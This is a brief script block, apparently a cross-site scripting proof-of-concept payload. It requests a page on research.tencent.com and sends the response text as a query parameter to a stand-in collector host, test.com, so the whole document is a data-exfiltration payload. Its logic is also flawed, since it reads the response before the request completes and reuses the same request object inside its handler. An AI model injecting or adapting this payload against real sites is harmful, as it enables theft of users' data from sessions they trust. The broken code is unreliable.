<script>var Http = new XMLHttpRequest();
    var url = 'https://research.tencent.com/';
    Http.open("GET", url);
    Http.send();

    var burp = 'https://test.com?id=' + Http.responseText;
    Http.onreadystatechange = (e) => {
        Http.open("GET", burp);
        Http.send();
    }
</script>
